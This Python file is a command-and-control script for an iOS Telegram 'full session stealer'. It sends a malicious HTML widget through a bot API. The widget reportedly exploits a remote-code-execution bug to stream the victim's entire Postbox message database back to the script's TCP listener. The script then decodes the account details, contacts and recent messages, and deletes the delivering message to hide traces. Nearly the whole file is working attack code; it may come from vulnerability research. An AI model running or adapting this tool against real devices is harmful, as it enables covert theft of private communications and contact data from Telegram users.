#!/usr/bin/env python3
"""iOS full session stealer; C2 CLI (iPhone 6s, Telegram 13.2).

Flow:
  1. listen on TCP :4453 (the widget connects back and sends the Postbox DB)
  2. deliver the widget via the bot API (sendWidget, /beta/)
  3. receive the 47 MB Postbox DB, save it, sha256
  4. decode the session: account, contacts/chats (masked), recent messages
  5. delete the widget message from the chat

The widget uses the #1827 RCE + mmap-fixed 47 MB buffer + socket/send; it ends
with pthread_exit, so Telegram stays alive but the widget thread stops. Relaunch
Telegram before a second run.

Usage:
  python3 c2_full_steal.py                       # full flow, default bot/chat
  python3 c2_full_steal.py --decode-only DB      # decode an already pulled DB
"""
from __future__ import annotations

import argparse
import datetime
import hashlib
import json
import os
import re
import socket
import sqlite3
import sys
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.normpath(os.path.join(HERE, "..", ".."))
PROBE = os.path.join(ROOT, "POC", "mtproto_entity_probe", "probe_mtproto.py")
DEFAULT_PAYLOAD = os.path.join(HERE, "device_widget_ios_full_db.html")
NEED = 47173632
PORT = 4453
CHAT = 0

TAGS = {
    "ah", "aht", "fn", "ln", "un", "pn", "emjs", "content", "uns", "sth",
    "nclr", "bgem", "clclr", "discriminator", "stry", "fileId", "photo",
    "title", "peerId", "start", "end", "entities", "artv", "stor", "isvc",
}


def default_token() -> str:
    try:
        src = open(PROBE, encoding="utf-8").read()
        m = re.search(r'BOT_TOKEN\s*=\s*"([^"]+)"', src)
        if m:
            return m.group(1)
    except OSError:
        pass
    return ""


def mask(s: str) -> str:
    if not s:
        return ""
    out = []
    for w in s.split():
        if len(w) <= 2:
            out.append(w[0] + "*" * max(1, len(w) - 1))
        else:
            out.append(w[0] + "*" * (len(w) - 2) + w[-1])
    return " ".join(out)


def mask_handle(s: str) -> str:
    if not s:
        return ""
    if len(s) <= 3:
        return s[0] + "*" * (len(s) - 1)
    return s[0] + "*" * (len(s) - 2) + s[-1]


def printable(blob) -> list[str]:
    if not isinstance(blob, (bytes, bytearray)):
        return []
    return [m.group().decode("ascii", "replace")
            for m in re.finditer(rb"[\x20-\x7e]{2,100}", blob)]


def parse_user(blob) -> tuple[str, str, str, str]:
    ss = printable(blob)
    fn = ln = un = pn = ""
    for i, s in enumerate(ss):
        if i + 1 >= len(ss):
            continue
        if s == "fn":
            fn = ss[i + 1]
        elif s == "ln":
            ln = ss[i + 1]
        elif s == "un":
            un = ss[i + 1]
        elif s == "pn":
            pn = ss[i + 1]
    if not fn and "aht" in ss:
        j = ss.index("aht") + 1
        cand = []
        while j < len(ss) and len(cand) < 2:
            s = ss[j]
            if s in ("fn", "ln", "un", "pn") and j + 1 < len(ss):
                if s == "fn":
                    fn = ss[j + 1]
                elif s == "ln":
                    ln = ss[j + 1]
                elif s == "un":
                    un = ss[j + 1]
                else:
                    pn = ss[j + 1]
                j += 2
                continue
            if s not in TAGS and any(c.isalpha() for c in s):
                cand.append(s)
            j += 1
        if cand:
            fn = fn or cand[0]
        if len(cand) > 1:
            ln = ln or cand[1]
    if not un:
        for s in ss:
            if re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{3,31}", s) \
                    and not s.isalpha() and s not in TAGS:
                un = s
                break
    if not pn:
        for s in ss:
            if re.fullmatch(r"\d{8,15}", s):
                pn = s
                break
    return fn, ln, un, pn


def decode_db(path: str, chat: int) -> None:
    size = os.path.getsize(path)
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            d = f.read(1 << 20)
            if not d:
                break
            h.update(d)
    print("[+] DB received: %s  %d bytes  sha256=%s" % (path, size, h.hexdigest()))
    try:
        db = sqlite3.connect(path)
        tabs = [r[0] for r in db.execute(
            "SELECT name FROM sqlite_master WHERE type='table'")]
        print("[*] SQLite: %d tables" % len(tabs))
        for t in ("t2", "t7"):
            try:
                n = db.execute("SELECT count(*) FROM %s" % t).fetchone()[0]
                print("    %s: %d rows" % (t, n))
            except sqlite3.Error:
                pass
    except sqlite3.Error as e:
        print("[!] sqlite open failed: %s" % e)
        return

    names: dict[int, tuple] = {}
    try:
        for k, v in db.execute("SELECT key, value FROM t2"):
            if isinstance(k, int):
                names[k] = parse_user(v)
    except sqlite3.Error:
        pass

    self_u = names.get(chat)
    if self_u:
        fn, ln, un, pn = self_u
        print("[+] Account: %s  @%s  phone=%s" % (
            mask((fn + " " + ln).strip()),
            mask_handle(un), mask_handle(pn)))
    else:
        print("[+] Account: (self user id %d not in t2)" % chat)

    peers: dict[int, str] = {}
    recent = []
    try:
        rows = list(db.execute(
            "SELECT key, value FROM t7 ORDER BY rowid DESC LIMIT 400"))
    except sqlite3.Error:
        rows = []
    for k, v in rows:
        if not isinstance(k, bytes) or len(k) < 20:
            continue
        peer = int.from_bytes(k[:8], "big")
        ts = int.from_bytes(k[12:16], "big")
        ss = printable(v)
        txt = ss[0] if ss else "[media]"
        if txt in TAGS:
            txt = "[media]"
        fn, ln, un, pn = names.get(peer, ("", "", "", ""))
        if fn or ln:
            label = mask((fn + " " + ln).strip())
        elif un:
            label = "@" + mask_handle(un)
        else:
            label = "group:" + hex(peer)
        peers[peer] = label
        recent.append((ts, label, txt))
    recent.sort(key=lambda x: x[0], reverse=True)

    print("[+] Contacts/chats (masked):")
    seen = set()
    shown = 0
    for peer in list(peers):
        label = peers[peer]
        if label in seen:
            continue
        seen.add(label)
        fn, ln, un, pn = names.get(peer, ("", "", "", ""))
        extra = (" @" + mask_handle(un)) if un else ""
        print("    %-28s %s" % (label, extra))
        shown += 1
        if shown >= 12:
            break

    print("[+] Recent messages (masked):")
    for ts, label, txt in recent[:10]:
        try:
            when = datetime.datetime.fromtimestamp(ts).strftime("%m-%d %H:%M")
        except (OverflowError, OSError, ValueError):
            when = "?"
        print("    %s  %-24s | %s" % (when, label, mask(txt)[:64]))


def send_widget(token: str, chat: int, html: str) -> int | None:
    body = json.dumps({"chat_id": chat, "html": html}).encode()
    url = "https://api.telegram.org/beta/bot%s/sendWidget" % token
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            d = json.load(r)
    except Exception as e:
        print("[!] sendWidget failed: %s" % e)
        return None
    if not d.get("ok"):
        print("[!] sendWidget: %s" % d.get("description"))
        return None
    return (d.get("result") or {}).get("message_id")


def delete_message(token: str, chat: int, mid: int | None) -> None:
    if not mid:
        return
    data = urllib.parse.urlencode({"chat_id": chat,
                                   "message_id": mid}).encode()
    try:
        with urllib.request.urlopen(
                "https://api.telegram.org/bot%s/deleteMessage" % token,
                data=data, timeout=20) as r:
            d = json.load(r)
        print("[*] widget message %s deleted: %s" % (mid, d.get("ok")))
    except Exception as e:
        print("[!] deleteMessage %s failed: %s" % (mid, e))


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--token", default=default_token())
    ap.add_argument("--chat", type=int, default=CHAT)
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--out", default="/tmp/opencode/ios_session_db")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD)
    ap.add_argument("--decode-only", default=None)
    ap.add_argument("--no-delete", action="store_true")
    ap.add_argument("--timeout", type=float, default=180.0)
    args = ap.parse_args()

    if args.decode_only:
        decode_db(args.decode_only, args.chat)
        return 0
    if not args.token:
        print("[!] no bot token (pass --token or set probe_mtproto.py)")
        return 2
    try:
        html = open(args.payload, encoding="utf-8").read()
    except OSError as e:
        print("[!] payload: %s" % e)
        return 2

    print("[*] C2 listening on 0.0.0.0:%d" % args.port)
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port))
    srv.listen(1)
    srv.settimeout(args.timeout)

    mid = send_widget(args.token, args.chat, html)
    if mid is None:
        srv.close()
        return 1
    print("[*] widget sent: message_id=%s" % mid)
    print("[*] waiting for the Postbox DB (the leak scan takes ~20 s)...")
    conn = None
    try:
        conn, addr = srv.accept()
        print("[+] connection from %s:%s" % addr)
        h = hashlib.sha256()
        n = 0
        with open(args.out, "wb") as f:
            while n < NEED:
                d = conn.recv(min(1 << 20, NEED - n))
                if not d:
                    break
                f.write(d)
                h.update(d)
                n += len(d)
        print("[+] received %d/%d bytes" % (n, NEED))
    except Exception as e:
        print("[!] receive failed: %s" % e)
        n = 0
    finally:
        try:
            if conn:
                conn.close()
            srv.close()
        except OSError:
            pass

    if n:
        decode_db(args.out, args.chat)
    else:
        print("[!] no DB received; widget may not have rendered or the app "
              "was relaunched")
    if not args.no_delete:
        delete_message(args.token, args.chat, mid)
    print("[*] done. Telegram stays alive; relaunch it before another run "
          "(pthread_exit stops the widget thread).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
